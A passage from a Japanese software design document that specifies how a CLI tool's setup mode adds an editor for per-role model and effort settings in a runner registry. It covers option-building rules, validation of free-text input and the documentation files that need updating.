  - **`exec_choice` は runner 名ではなく engine 選択（`claude` / `codex` / `ask`）である**
    （`config-edit.sh` の `valid_value`）。`runners[] | select(.name == "claude")` を
    引くと 0 件になり、現在の exec runner が静かに落ちる。engine から解決した runner を
    使うこと。
  - 優先集合が空（`default` が不正で役割キーが全部 `"ask"` / 未設定 / 不正）なら
    **登録順の先頭 5 件**を使う。残りは 1 行要約にする。
  - 1 行要約の書式（逐語。`models` / `efforts` / `-` は識別子として英日とも ASCII のまま）:
    `- <name> (<engine>): models <plan>/<review>/<exec>, efforts <plan>/<review>/<exec>`
    値はすべて**実効値**（未設定なら既定値、codex model の未設定は `-`）。
  - 閾値 5 は AskUserQuestion の 4 択上限とは無関係の**表示上の**閾値で、
    6 runner = 36 行を超えると実用に耐えないので 5 件で切る。M1 の「5 件以上なら
    先頭 4 件」（選択肢の上限）とは別の数え方であることを doc にも書く。
- サンプルの表ヘッダ `| role | model | effort |` と見出し行
  `runner: <name> (command: <command>, engine: <engine>)` は**識別子なので英日とも
  ASCII のまま**にする（§2.4 の候補プール表と同じ扱い）。日本語化するのは
  `default (<value>)` ↔ `既定（<値>）` のような**状態ラベル**だけ。
- **`engine` が `claude` / `codex` でない runner**（欠落 / `gemini` など）は実効既定値も
  codex 例外の適用可否も決まらない。model / effort の全セルを `-` にし、engine 欄に
  EN `unusable engine — cannot be edited here` ↔ JA `engine 不明 — ここでは編集できません`
  を添える（§2.3 の M1 除外と対）。
- 未設定は空欄ではなく実効値を見せる。EN `default (<value>)` ↔ JA `既定（<値>）`。
  このラベル形式は First-run setup（`SKILL.md:469-472` の `default (xhigh)` など）の
  先例と一致する。
- **役割キーの `unset` 表示とは表記が違うが、これは正当な区別である。** 役割キーは
  三値（固定値 / `"ask"` / 未設定）なので状態そのものを見せる必要があり
  EN `unset` ↔ JA `未設定`（`setup-mode.md:83` / `setup-mode-ja.md:64` の既存表記）と書く。
  runner フィールドは二値（設定済み / 未設定）で、未設定でも実効値が決まっているので
  実効値を見せる方が有用。
- **例外**: codex runner の model が未設定のときは実効既定値が存在しない。
  - `plan_model` / `exec_model` → EN `unset (codex-side default)` ↔
    JA `未設定（codex 側デフォルト）`
  - `review_model` → EN **`unset (not review-capable)`** ↔
    JA **`未設定（レビュアーに選べません）`**。codex reviewer は `review_model` が
    必須で、未設定は「既定にフォールバックする」ではなく「reviewer に選べない」を
    意味する（§2.4 の警告と対になる）。

#### 2.2 S2 — 質問コール①

Q2「対象」は現行 3 択（役割キーのみ / `runners.json` のみ / 両方）。**選択肢の数と
意味は変えず、3 つのラベル（および選択肢 1 の説明）を model / effort が含まれることが
分かる形にそろえる。**

| # | EN ラベル | JA ラベル | description |
|---|---|---|---|
| 1 | `the role keys only` | `役割キーのみ` | EN `per-role models and efforts live in the registry; pick option 2 or 3 to reach them` ↔ JA `役割別の model / effort はレジストリ側にあります。2 か 3 を選ぶと到達できます` |
| 2 | `the runner registry (models and efforts included)` | `runners.json（役割別 model / effort を含む）` | — |
| 3 | `both — the role keys and the registry (models and efforts included)` | `両方 — 役割キーとレジストリ（役割別 model / effort を含む）` | — |

model / effort は `runners.json` の中身なので、対象を 4 つへ増やすと「`runners.json` と
モデル設定の違いは何か」という無意味な区別を利用者に強いる。ラベルと説明だけで
発見可能性を補い、選択肢 1 を選んだ利用者にも到達経路を伝える。

#### 2.3 S3 — `runners.json`（対象に含まれるときだけ）

ファイルが存在するときの選択肢を 3 択から 4 択にする。**EN / JA ラベルを確定させる。**

| # | EN ラベル | JA ラベル | 動作 |
|---|---|---|---|
| 1 | `add a runner` | `runner を追加` | 既存どおり First-run setup の対話で 1 件足す |
| 2 | **`edit an existing runner's models and efforts`** | **`登録済み runner の model / effort を編集`** | **新規。S3-M へ** |
| 3 | `rebuild the registry from scratch` | `レジストリを作り直す` | 既存どおりレジストリを再構築 |
| 4 | `leave it alone` | `そのまま` | 既存どおり何もしない |

ちょうど AskUserQuestion の 4 選択肢上限に収まる。

**S3-M へ到達しない経路を網羅する。**

- **S2 Q2 で選択肢 1（役割キーのみ）を選んだ** — S3 自体が走らない。
- **ファイル不在時** — 従来どおり First-run setup が走る。First-run setup は
  6 フィールドをその場で収集するので、S3-M は提示せず S4 へ向かう。
- **`--show` が非 0 で返るとき（破損レジストリ、§1.5）** — S1 が失敗し `runners[]` を
  列挙できない。**選択肢 2 を出さず、選択肢 3（作り直し）へ誘導する。**
- **選択肢 1（追加）/ 3（作り直し）の後** — 同じ理由で S3-M は提示せず S4 へ向かう。
  追加した runner を続けて編集したい場合は `--setup` を再実行する。
- **`runners[]` が空配列 / 除外後に選択可能 runner が 0 件のとき** — 選択肢 2 を**出さない**
  （M1 の選択肢が 0 件になり AskUserQuestion の最低 2 選択肢を満たせないため）。
- **選択可能 runner が「ちょうど 1 件」のとき** — 同じ理由で 2 選択肢を満たせないが、
  **選択肢 2 は出す**。M1 を出さずにその 1 件を黙って採用し、M2 へ進む。runner 1 件は
  最も普通の構成であり、リポジトリにも先例がある（`CLAUDE.md` 保守項目 37
  「runner 数分岐（1 件は黙って採用・質問なし）」）。
- **`engine` が `claude` / `codex` でない runner**（欠落 / `gemini` など）は M1 の
  選択肢から**除外して警告する**。規則 1 の 4 形も候補プールも決まらず質問を
  組み立てられないので、M3 まで進んだ末に S7 で exit 2 になるより先に止める。
  除外の結果、選択可能な runner が 0 件になったら選択肢 2 自体を出さない。
- **`'` を含む runner 名**も同じ理由で除外して警告する（§2.4 M1）。
- **1 回の `--setup` で編集できる runner は 1 件**（M1 は単一選択）。

#### 2.4 S3-M — model / effort エディタ（新規）

S3 で選択肢 2 を選んだときだけ走る。**happy path で AskUserQuestion 3 コール**
（再質問経路が 3 本あるので最悪 +3 = 6 コール）。

このサブセクション配下の下位見出しは **`####` を使う**。SU8 は
`^#\{1,3\} ` を数えるので `####` はカウント対象外であり、英日で
**見出しレベル・個数・順序をすべて一致させる**（`####` は両ファイルにとって新しい深さで、
SU8 は不一致を検出できないため、SU15 に個数一致と下限のアサーションを持たせる）。

> **doc へ写すときの見出し名は §3.0.1 (2) の表を正とする。** 以下の設計書側の下位見出しには
> `（1 問）` や `` ` `` などの装飾が付いているが、SU15 (3) が grep するのは §3.0.1 の形である。
> 節見出しそのもの（`### S3-M`）も §3.0.1 (2) の直前に置いた行で英日を確定させる。

##### M1. どの runner か（1 問）

選択肢は `runners[]` のエントリ（label = `name`、description = `command (engine)`）。
登録が 5 件以上なら**先頭 4 件を出し、残りは自動 "Other" 自由入力**で受ける。これは
S5 の `design_runner` 選択（`setup-mode.md` の "With more than four registered, offer
the first four"）と同じ規約である。

> `--override` の Call 3 は runner を **3 件**しか出さない（`SKILL.md:842`）が、これは
> 規約の分裂ではない。あちらは第 1 枠が `keep (<resolved runner>)` に取られるための
> 必然であり、**keep 枠を持つ質問は 3 件、持たない質問（M1 / S5）は 4 件**という
> 一貫した数え方になっている。M1 は keep 枠を持たないので 4 件。

"Other" に登録されていない名前が入力されたら、警告して同じ質問を**もう一度だけ**出す。
2 回目も未登録なら S3-M を中止して S4 へ進む（無限ループにしない。effort / model の
再質問規定と対称）。**新規 runner は作らない**（runner の追加は S3 の選択肢 1 の担当）。

**`'` を含む runner 名は S3-M の対象から除外して警告する。** runner 名は
`runners-edit.sh` が書く値ではなく読む値であり、§1.3 の deny-list の対象外である。
First-run setup は name を無検証で書くので、`'` を含む名前があると S7 が組み立てる
`--name '<runner>'` を単一引用では守れない（§1.3.1 の層 1）。

##### M2. model 3 問（1 コール）

`plan_model` / `review_model` / `exec_model` を 1 コールで聞く。

##### M3. effort 3 問（1 コール）

`plan_effort` / `review_effort` / `exec_effort` を 1 コールで聞く。

##### 役割単位ではなく次元単位にした理由

`--override`（Step 1g-2）は「どの役割か」を先に聞いてから役割ごとに 1 コールを出す。
ここでは採らない。

- `--override` はタスクごとに engine が変わりうるので役割単位が自然だが、`--setup`
  では**編集対象の runner が 1 つに固定**されており、6 フィールドすべてが同じ engine
  で解釈される。役割ごとに分ける理由がない。
- 各問の第 1 選択肢が常に「変更なし」なので、「この役割は触らない」は選択肢 1 で
  表現できる。役割選択の前置き質問は情報を増やさない。
- 結果として M1 + M2 + M3 の **3 コール**になる。`--override` を 1 タスク・全 3 ロールに
  適用したときが 5 コール（Call 1 + Call 2 + Call 3×3）なので、同条件で 2 コール少ない。

##### 選択肢の組み立て（静的な表ではなく動的規則）

**静的な選択肢表は作らない。** 既定値を明示的に書くこととフィールドを削除することが
実効同値になる組み合わせが多く（「前提として守る事実」の解決順序の帰結を参照）、
表に固定すると 4 枠のうち 1〜2 枠が常に死ぬ。First-run setup（`SKILL.md:469-472`）も
重複なしで組んでいる。

各問は次の規則で組み立てる。

1. **opt1 = 変更なし。**

   | 状態 | EN | JA |
   |---|---|---|
   | 設定済み | `keep (<current>)` | `変更なし（現在: <現在値>）` |
   | 未設定・実効既定値あり | `keep (default: <d>)` | `変更なし（既定: <d>）` |
   | 未設定・codex `plan_model` / `exec_model` | `keep (unset — codex-side default)` | `変更なし（未設定 — codex 側デフォルト）` |
   | 未設定・codex `review_model` | `keep (unset — not review-capable)` | `変更なし（未設定 — レビュアーに選べません）` |

2. **opt2 以降 = 候補プールから順に埋める。** プールから
   **現在値**と**実効既定値**を除外したうえで、先頭から順に取る。
3. **最終枠。規則 2 より優先して確保する**（先に規則 2 で 4 枠を埋めてしまうと、
   フィールドを未設定へ戻す唯一の経路が消える。"Other" の空文字は「変更なし」扱い
   なので代替にならない）。あぶれた候補は規則 4 で "Other" へ回る。

   | 条件 | EN | JA |
   |---|---|---|
   | 設定済み かつ **実効既定値が存在し**、それと異なる | `back to the default (<d>)` | `既定に戻す（<d>）` |
   | 設定済み かつ codex `plan_model` / `exec_model` | `unset it (codex-side default)` | `未設定に戻す（codex 側デフォルト）` |
   | 設定済み かつ codex `review_model` | `unset it (not review-capable)` | `未設定に戻す（レビュアーに選べません）` |
   | 設定済み かつ 実効既定値と一致（claude model / 両 engine の effort） | **出さない**（opt1 と実効同値になるため） | 同左 |
   | 未設定 | **出さない** | 同左 |

4. 4 枠に収まらない候補は自動 "Other" 自由入力から到達できる。**ダミーの選択肢は
   置かない。**

**選択肢は必ず 2 つ以上になる。** 規則 2 の除外は高々 2 件（現在値と実効既定値が一致すれば
1 件）なので、**最小のプールである claude `*_model`（3 件）でも最低 1 件は残る**。
設定済みなら規則 3 がさらに 1 枠を足す。codex model は候補導出 step 3 の
`gpt-5.6-sol` 補充が下限を保証する。実装者が床を再導出しなくて済むよう、この 1 文を
doc にも書く。

**候補プール**（engine 別、この順序）。この 2 行は `setup-mode.md` /
`setup-mode-ja.md` へ**逐語で焼き込む**（SU12 のアンカー。§3 / §4.2 参照）。

| target | pool |
|---|---|
| claude `*_model` | `opus[1m]` / `sonnet` / `fable` |
| codex `*_model` | see the codex candidate derivation below |
| claude `*_effort` | `max` / `xhigh` / `high` / `medium` / `low` |
| codex `*_effort` | `xhigh` / `high` / `medium` / `low` / `minimal` |

**`max` は claude のプールにしか無い。** codex 側のどの経路（プール / 既定 / "Other"
の受理）にも現れない。表のヘッダと `codex *_model` のセルは**英語**にしてある
（表ごと英語 doc へ転記されるので、日本語が混ざると `check-doc-lang.mjs` の
`japanese-in-english-doc` で `pnpm check` が落ちる）。**SU12 がアンカーにするのは
`claude *_effort` と `codex *_effort` の 2 行だけ**で、両行のセル文言はすべて ASCII
なので英日で真に同一にできる。

例（claude runner、`plan_effort` 未設定 = 実効既定 `xhigh`）:
`keep (default: xhigh)` / `max` / `high` / `medium`
（`xhigh` は既定なので除外、`low` は枠外で "Other" 送り）。

例（claude runner、`plan_effort: "max"`。実効既定 `xhigh` と異なる）:
`keep (max)` / `high` / `medium` / `back to the default (xhigh)`
（`max` は現在値、`xhigh` は実効既定なのでプールから除外。規則 3 が最終枠を先に確保
するので候補は 2 件で止まる）。

例（claude runner、`plan_effort: "xhigh"`。実効既定と一致）:
`keep (xhigh)` / `max` / `high` / `medium`
（規則 3 は最終枠を出さない。`low` は "Other" 送り）。

例（codex runner、`review_model: "gpt-5.6-sol"`、レジストリ中の codex model が
これ 1 種類だけ）: `keep (gpt-5.6-sol)` / `unset it (not review-capable)`
（候補プールは空。床の 2 択は規則 3 が支える）。

**上の 4 例のラベルは EN 形である。`setup-mode-ja.md` へ写すときは規則 1 / 3 の JA 形
（`変更なし（既定: xhigh）` / `既定に戻す（xhigh）` / `変更なし（未設定 — レビュアーに
選べません）` / `未設定に戻す（レビュアーに選べません）`）へ置換する。** そのまま写すと
§2 冒頭が警戒する「英語ラベルの素通り」が起き、`check-doc-lang` では検出できない。

##### codex model 候補の導出

`runners.json` 全体に出現する codex model 文字列（`engine: codex` のレコードに属する
`plan_model` / `review_model` / `exec_model` の値）を集め、次の順序で確定する。

1. **編集中の当該フィールドの現在値を除外**する（除外しないと opt1 と重複する）。
2. 重複除去し、`runners[]` の**登録順**（同一 runner 内では
   `plan_model` → `review_model` → `exec_model` の順）に並べる。
3. 枠が余ったら First-run setup の先例（"for codex offer free text (e.g. `gpt-5.6-sol`)"）
   に従い `gpt-5.6-sol` を 1 件だけ補充する。
   **補充するのは `gpt-5.6-sol` が step 2 のプールにも「現在値」にも一致しないときだけ。**
   （現在値が `gpt-5.6-sol` のとき step 1 が除去した直後に補充し直すと opt1 と重複する。
   all-Codex の正典例 `gpt-5.6-sol` / `gpt-5.6-sol` / `gpt-5.6-terra` でまさに起きる。）
4. それでも枠が余ったら**枠を減らす**。ダミーは置かない。床（opt1 + 1 件）を実際に
   支えているのは **step 3 の `gpt-5.6-sol` 補充**である。`engine: codex` の runner は
   いるがどの codex runner も 3 つの model を 1 つも設定していない状態（First-run setup で
   全部空欄にした直後）では、step 1 が何も除去しなくても step 2 のプールは空になるため。

##### codex `review_model` を unset するときの警告

codex reviewer は `review_model` が必須で、未設定のまま reviewer に選ばれると
`prewarm-panes.sh` が

```
die "codex reviewer runner '<name>' requires review_model"
```

で**起動時に落ち、ディスパッチそのものが失敗する**。`--setup` の数日後に踏むと
原因に辿り着く手がかりが無い。3 段で防ぐ。

- **(a) S1** — EN `unset (not review-capable)` ↔ JA `未設定（レビュアーに選べません）`
  と表示する（§2.1）。
- **(b) M2** — 規則 3 の `unset it (not review-capable)` ↔ `未設定に戻す（レビュアーに
  選べません）` 選択肢の description に
  EN `this runner can no longer be chosen as the reviewer` ↔
  JA `この runner はレビュアーに選べなくなります` と書く。
- **(c) S6** — unset した結果その runner が現在の `review_runner`（project / global の
  どちらか）だった場合は、S6 の警告リストに次の 1 行を載せる。
  EN `removing review_model from <runner> — it is the current review_runner, so the next dispatch will fail to start`
  ↔ JA `<runner> の review_model を削除します。現在の review_runner なので、次回のディスパッチは起動に失敗します`

##### 自由入力の扱い

警告文言はすべて英日で確定させる（`--setup` はユーザーへ提示する）。

| 場面 | EN | JA |
|---|---|---|
| M1 "Other" が未登録名 | `no runner named <name> is registered; pick one from the list` | `<name> という runner は登録されていません。一覧から選んでください` |
| M1 が `'` を含む名前を除外 | `runner <name> contains a single quote and cannot be edited here; edit runners.json by hand` | `runner <name> は名前に ' を含むためここでは編集できません。runners.json を手で編集してください` |
| M1 が engine 不明の runner を除外 | `runner <name> has no usable engine and cannot be edited here` | `runner <name> は engine が不明なためここでは編集できません` |
| effort "Other" が範囲外 | `<value> is not a valid effort for the <engine> engine` | `<value> は <engine> engine の effort として不正です` |
| model "Other" が拒否条件に触れた | `<value> cannot be used as a model name (it is empty, padded with whitespace, or contains a shell metacharacter or a control character)` | `<value> はモデル名に使えません（空・前後に空白・シェルメタ文字・制御文字のいずれか）` |
| S6 の警告リスト見出し | `Warnings:` | `警告:` |

- **effort の "Other"** — engine 別 allowlist と照合する。範囲外なら警告して
  **その 1 問だけ**を再質問する（1 回まで）。2 回目も範囲外ならそのフィールドは
  変更せず、警告を S6 のプレビューへ持ち越す。`--setup` は永続化するので、
  `--override` のように黙って既定へフォールバックすると「入力した値と違う値が
  保存される」ことになり、あとから気づけない。
- **model の "Other"** — モデル名としては検証しないが、§1.3 の拒否条件
  （空 / 空白のみ / **前後に空白を持つ値** / 5 つのシェルメタ文字 / `[[:cntrl:]]`）は
  適用される。**内部の空白は通る**（`opus 1m` は受理される。値は層 2 / 3 で必ず引用の
  内側に置かれ、§2.6 が記述例の単一引用を規約化しているので引数が割れる経路は無い）。違反したら警告して
  その 1 問だけを再質問する（1 回まで。effort と対称）。**この事前チェックが
  §1.3.1 の層 1（S7 のコマンドライン）を守る唯一のガードである** — スクリプト側の
  deny-list はシェルの後ろにあるので層 1 には届かない。**この拒否条件は
  `setup-mode.md` / `setup-mode-ja.md` に「S3 の選択肢 2 経由のみ」という限定句つきで
  明記する**（§3）。
- **空文字** — どちらの次元でも「変更なし」として扱う。

> **語彙について**: 役割キーの EN `back to unset` ↔ JA `未設定に戻す`
> （`setup-mode.md` S4/S5、`setup-mode-ja.md`、`README.md`、`guide-ja.md`、`SKILL.md`
> に一貫して出る）とは別の語彙 EN `back to the default (<d>)` ↔ JA `既定に戻す（<d>）`
> を使う。これは §2.1 が立てた「役割キーは三値なので状態を見せる、runner フィールドは
> 二値なので実効値を見せる」区別に基づく**意図的な差**である。
> **ただし codex `*_model` だけは実効既定値が無いので `unset` 語形を使う**
> （規則 3 の例外 2 行）。

#### 2.5 S6 — プレビューと確認

プレビューが 2 ファイル分になる。

- `config.json` の before / after（既存どおり）
- `runners.json` は**編集対象の runner レコードだけ**の before / after。
  - **before**: `runners-edit.sh --runners <path> --name <runner> --show`
  - **after**: `runners-edit.sh --runners <path> --name <runner> <同じ --set / --unset 群> --dry-run`

  **両方ともレコード単体を出すので、呼び出し側の jq はゼロになる。** S7 に渡すのと
  完全に同じ `--set` / `--unset` 群を使うことが、プレビューと実書き込みの一致を担保する
  唯一の手段である。

S3-M で持ち越した警告（effort / model の "Other" 再入力失敗、codex `review_model` の
unset、M1 の除外）があれば `Warnings:` ↔ `警告:` の見出しの下に列挙する。
確認は従来どおり「書き込む / 中止」の 1 問。中止は何も書かない。

#### 2.6 S7 — 書き込み

**現行 S7 の置き換えではなく、1 番目のステップとして挿入する。** 現行 S7 の散文は
**語句をそのまま残す**。英日それぞれ次の 3 点は消してはならない。

セルは 1 本の連続した文である（バックティック入れ子を避けるため ` + ` で連結表記して
いる箇所は、**連結して 1 文にしてから** doc へ書き、needle にもその 1 文を使う）。
現物では折り返されている（`setup-mode.md:139-140`）ので、**SU16 は平坦化テキストに対して
`grep -F` する**（§4.2 冒頭）。

| # | `setup-mode.md`（逐語） | `setup-mode-ja.md`（逐語） | 理由 |
|---|---|---|---|
| 1 | `so the whole result lands in a single atomic move.` | `結果全体が単一の mv で反映されるようにする。` | **`single atomic move` はリポジトリ全体で `setup-mode.md:140` にしか無く、SU5 が grep する 10 needle の 1 つ。** 消すと SU5 が実際に赤くなる |
| 2 | `For the project destination, ` + `` `mkdir -p .dispatch` `` + ` first.` | `プロジェクト宛なら先に ` + `` `mkdir -p .dispatch` `` + ` する。` | SU3 / SU5 の grep 対象ではないので、消えてもテストが落ちない。SU16 で塞ぐ |
| 3 | `tell the user it now shadows the global layer` | `このリポジトリではグローバルより優先されることをユーザーに伝える。` | 同上。**JA 側に「シャドウ」という語は存在しない**ので、needle は上の逐語文字列にする |

改訂後の順序（**この箇条書きは設計書の説明であって `setup-mode.md` へ写す文面ではない。
英語 doc へ日本語のまま落とすと `japanese-in-english-doc` で `pnpm check` が落ちる**）:

```
1. runners-edit.sh を最大 1 回（全 --set / --unset を 1 コールに載せる）   ← 新規
2. プロジェクト書き込み先なら mkdir -p .dispatch                            ← 既存（原文温存）
3. config-edit.sh を最大 1 回。「single atomic move」の一文を含む既存散文を
   そのまま維持する                                                        ← 既存（原文温存）
4. 双方を --show で表示する
5. プロジェクトレイヤーへ書いたなら優先される旨を伝える                     ← 既存（原文温存）
```

**レジストリを先に書く**。役割キー（`design_runner` など）は runner を名前で参照するので、
config を書く時点でレジストリ側が確定している方が読み手にとって自然である。ここでは
runner の追加も削除もしないので順序が結果を変えることはないが、順序を決めておくこと
自体に価値がある（SU16 が行順で固定する）。

**2 ファイルは 1 トランザクションではない**ことを明記する。各呼び出しは個別に原子的
だが、両者をまたぐ原子性は無い。**どちら向きの失敗でも、成功した分を報告したうえで
残りの完全なコマンドラインを提示して停止する。**

- 手順 1 が失敗 → 手順 3 を実行せず、`config-edit.sh` の完全なコマンドラインを提示。
- 手順 3 が失敗 → 手順 1 が成功済みである旨を伝え、`config-edit.sh` の完全な
  コマンドラインを提示。

**シェルのクォート規約**: `--set` の値には自由入力の model 文字列が載る。空白で引数が
割れ、`'` でクォートが破れる。`setup-mode.md` / `setup-mode-ja.md` に追加する記述例は
必ず単一引用付きにする。

```bash
bash <SKILL_DIR>/scripts/runners-edit.sh --runners <path> --name 'ccenec' \
  --set 'plan_model=opus[1m]' --set 'plan_effort=max' --unset exec_model
```

**単一引用は値が `'` を含まないことを前提とする。その前提を保証するのは
§2.4「自由入力の扱い」の "Other" 事前チェックであり、`runners-edit.sh` の
deny-list ではない**（§1.3.1 の層 1）。`--name` に渡す runner 名も同じ理由で、
§2.4 M1 が `'` を含む名前を除外することで守られている。

---

### 3. ドキュメント同期

`apps/cmux-team-dispatch-task/CLAUDE.md` の 4 ファイル整合ルールと、`setup-mode.md` /
`setup-mode-ja.md` のミラー規則の両方に従う。**節単位で列挙する**（ファイル名だけだと
stale になる節が漏れる）。**この表が SoT** であり、件数の要約は書かない
（要約を書くと表を足したときに片方だけ古くなる）。

見出しを触る行は実物の正式見出しで、表・段落を触る行は「節名 + 追記対象」で書き分ける。

| ファイル | 対象 | 変更 |
|---|---|---|
| `setup-mode.md` | `### S1. Show the current state` | §2.1 のとおり転置形へ。元データは `--show` |
| 〃 | `### S2. Ask call ① — 2 questions` | Q2 の 3 ラベルと description を §2.2 の EN 表記へ |
| 〃 | ``### S3. `runners.json` (only when it is a target)`` | 4 択（§2.3 の EN ラベル）と到達不能リスト |
| 〃 | `### S3-M`（新設） | S3-M 本体。下位見出しは `####`。**英日で個数・順序・見出し名（下記の 8 個）を一致させる** |
| 〃 | S3-M 内の候補プール表 | claude / codex の `*_effort` **2 行を逐語**で持つ（SU12 のアンカー）。ヘッダと `codex *_model` セルは英語 |
| 〃 | S3-M 内の `*_model` 拒否条件 | 空 / 空白のみ / **前後に空白を持つ値** / `'` `"` `` ` `` `$` `\` / `[[:cntrl:]]` を拒否する旨（**内部の空白は通る**）。**限定句を下記の逐語文で添える**（§1.3.1） |
| 〃 | `### S6. Preview and confirm` | 2 ファイル分のプレビューと `Warnings:` |
| 〃 | `### S7. Write` | **挿入であり置換ではない**（§2.6 の温存表の逐語 3 文を維持） |
| 〃 | `## All writes go through \`config-edit.sh\`` | **改題 ＋ `runners-edit.sh` の I/F 段落を追記**（下記 3.1） |
| `setup-mode-ja.md` | 上記すべての対応節 | 同一構造・**同一見出しレベル・同一個数・同一順序**。ユーザー可視文字列は §2 の JA 表記。`## 書き込みは全て \`config-edit.sh\` を通す` も改題 |
| `SKILL.md` | `## Setup Mode (explicit configuration)` | 「役割別 model / effort も設定できる」旨を 1 文追加。**`runners-edit.sh` を名指しする**（SU13 のアンカー） |
| 〃 | ``Both modes write exclusively through `scripts/config-edit.sh`,`` の 1 文（`SKILL.md:117`） | 下記 3.1 の限定へ |
| 〃 | **First-run setup 見出し（`SKILL.md:433-434`）** | 現行の `(…, and when --setup selects the registry as a target)` は、S3 に選択肢 2 が増えると偽になる。選択肢 1 / 3 に限る旨へ |
| 〃 | **`SKILL.md:822`** `Never call config-edit.sh here.` | `--override` は `runners-edit.sh` も呼んではならない。`runners.json` は永続化先なので `config-edit.sh` と同じ扱い |
| `guide-ja.md` | `## セットアップモード（設定の明示構成）` | SKILL.md 変更の 1:1 訳。**`runners-edit.sh` を名指しする**（SU13 のアンカー） |
| 〃 | **`## リセットモード（設定のリセット）` 配下の `guide-ja.md:67`** | 「両モードとも書き込みは `scripts/config-edit.sh` **だけ**を通す」。`SKILL.md:117` の 1:1 訳だが**セットアップモード節ではなくリセットモード節の下**にあるので、節名だけを追うと漏れる |
| 〃 | **`guide-ja.md:251`** 「`config-edit.sh` はここでは絶対に呼ばない。」 | `SKILL.md:822` の訳。同じく `runners-edit.sh` を追加 |
| 〃 | **`### 設定（\`--setup\`）`（`guide-ja.md:1363`）** | `README.md:84-98` の逐語ミラー。README だけ直すと 4 ファイル整合違反。SKILL.md 由来ではないので「1:1 訳」では拾えない |
| 〃 | **`### 初回セットアップ`（`guide-ja.md:1641`）** | 本文の「…または `--setup` で `runners.json` を対象に選んだときは、初回セットアップが起動します」が同じ理由で偽になる |
| `README.md` | `### 設定（\`--setup\`）` | model / effort 設定を追記 |
| 〃 | **`README.md:286` の段落** | 「どちらも書き込みは `scripts/config-edit.sh` を通し、置換ではなくマージします」。§3.1 と同じ限定を付ける |
| 〃 | **`README.md:131`** 「**config には一切書き戻しません。**」（`--override`） | `runners.json` へも書き戻さない旨を追加 |
| `CLAUDE.md` | ファイル構成表 | `runners-edit.sh` の行を追加。**隣接する `CLAUDE.md:19`（`config-edit.sh` = 「config.json への唯一の書き込み口」）は真のまま**なので文言を変えず、並びだけ整える |
| 〃 | **ファイル構成表の `runners.json` 行（`CLAUDE.md:23`）** | 「`--setup` / `--reset runners` からも**再生成**される」→ `--setup` はフィールド単位の編集も行う旨へ |
| 〃 | **`CLAUDE.md:91`**（role 解決の現行契約、`--override`） | 「**config へ書き戻さない**（`config-edit.sh` を呼ばない）」→ `runners-edit.sh` も追加 |
| 〃 | 保守手順 28 の「書き込みは **`scripts/config-edit.sh` だけ**を通す」（`CLAUDE.md:247`） | 「だけ」は追記では消えない。§3.1 と同じ限定へ書き換える |
| 〃 | 保守手順 28 の回帰行（`CLAUDE.md:251`） | `SU1-SU9` → **`SU1-SU16`**、`test-runners-edit.sh`（**RE1-RE20。RE9b / RE9c / RE9d / RE9e / RE14a / RE14b / RE18b を含む**）を追加。sub-id を明記するのは項目 15 の `SP0a-SP0d / SP1-SP24` と同じ慣習 |
| 〃 | 保守手順 28 本文 | `runners-edit.sh` の契約、SU10-SU16 の needle 一覧、**`setup-mode.md` / `setup-mode-ja.md` の両方**が維持する義務 4 つ: (1) SU12 のアンカー 2 行を §2.4 と 1 バイト一致で持つ、(2) S7 温存 3 文を逐語で持つ、(3) **S7 節内で `runners-edit.sh` の記述が `config-edit.sh` の記述より前にある**、(4) §3.0.1 の限定句 2 文と `####` 8 見出しを逐語・同順で持つ |
| 〃 | **保守手順 44（`--override`）の検査条件（`CLAUDE.md:256-257`）** | 「`config-edit.sh` を**呼び出す**記述が無いこと」→ **`config-edit.sh` / `runners-edit.sh` のどちらも**。`test-override.sh` には `config-edit` の grep が 1 件も無いので機械的には捕まらない |
| 〃 | 保守手順 44 の末尾 | §2.4「次元単位 vs 役割単位」と effort 範囲外時の挙動差（`--override` は警告して既定へフォールバック / `--setup` は再質問）を**意図的な差**として 1 行 |
| 〃 | 「テスト方法」E2E 項目 43 | S3-M のケースを追記（§4.3 の限界と対）。**E2E は 43 の次が 45 で 44 が欠番だが、これは既存の欠番なので触らない** |

#### 3.0.1 逐語で焼く 2 つの文字列

**(1) `*_model` 拒否条件の限定句。** SU10 / SU15 がこれを needle にするので、英日とも
**下の文をそのまま**書く。自然な英訳に任せると `only through option 2` が部分列として
現れず SU10 が赤くなる。

| ファイル | 逐語文 |
|---|---|
| `setup-mode.md` | `This rejection applies only through option 2 of S3; the First-run setup paths behind options 1 and 3 do not validate the value.` |
| `setup-mode-ja.md` | `この拒否は S3 の選択肢 2 経由のみに適用される。選択肢 1 / 3 の First-run setup は値を検証しない。` |

**(2) 節見出しと S3-M 配下の `####` 見出し 8 個。** SU15 が個数・下限に加えて**順序**まで
検査できるよう、名前と順序を確定させる。**節見出しそのものも英日で固定する**:
`setup-mode.md` は `### S3-M. Edit a runner's models and efforts`、
`setup-mode-ja.md` は `### S3-M. runner の model / effort を編集する`。
（SU10 / SU15 の needle は `S3-M` の部分列なのでどちらでも落ちないが、
英日ミラーの揺れを消すために確定させる。）

| # | `setup-mode.md`（EN） | `setup-mode-ja.md`（JA） |
|---|---|---|
| 1 | `#### M1. Which runner` | `#### M1. どの runner か` |
| 2 | `#### M2. Three model questions in one call` | `#### M2. model 3 問（1 コール）` |
| 3 | `#### M3. Three effort questions in one call` | `#### M3. effort 3 問（1 コール）` |
| 4 | `#### Why by dimension rather than by role` | `#### 役割単位ではなく次元単位にした理由` |
| 5 | `#### Building the options` | `#### 選択肢の組み立て` |
| 6 | `#### Deriving the codex model candidates` | `#### codex model 候補の導出` |
| 7 | `#### Warning when a codex review_model is unset` | `#### codex review_model を unset するときの警告` |
| 8 | `#### Free-text answers` | `#### 自由入力の扱い` |

**変更不要と確認済み**（誤って足さないこと）:

- `.codex-plugin/plugin.json` / ルート `.claude-plugin/marketplace.json`（version のみ保持、
  非目標により対象外）
- `references/loop-mode*.md` / `references/unattended/*.md`（`--setup` も `config-edit.sh`
  も出現しない）、`docs/notification-gaps.md`
- **主語が「役割キー 5 つ」に限定されていて変更後も真な同一命題 4 箇所**:
  `SKILL.md:490` / **`guide-ja.md:1494-1497`** / **`README.md:247-250`** の
  「3 通りの設定経路」と
  **`CLAUDE.md:193`（保守手順 19）「書き込みは全経路とも `scripts/config-edit.sh` を通すこと」**（逐語。1 語違うと改題作業時に grep で拾えない）。
  3 つだけ挙げて 1 つ落とすと誤って追記されるので 4 ファイル分を列挙する
  （`guide-ja.md` を 2 回数えて 3 ファイルにしない）。
- **`--reset` の R2 節**（`setup-mode.md:159-169` / `setup-mode-ja.md:121-127` /
  `README.md:109` / `guide-ja.md:1380`）。`setup-mode.md:164` に `config-edit.sh` の
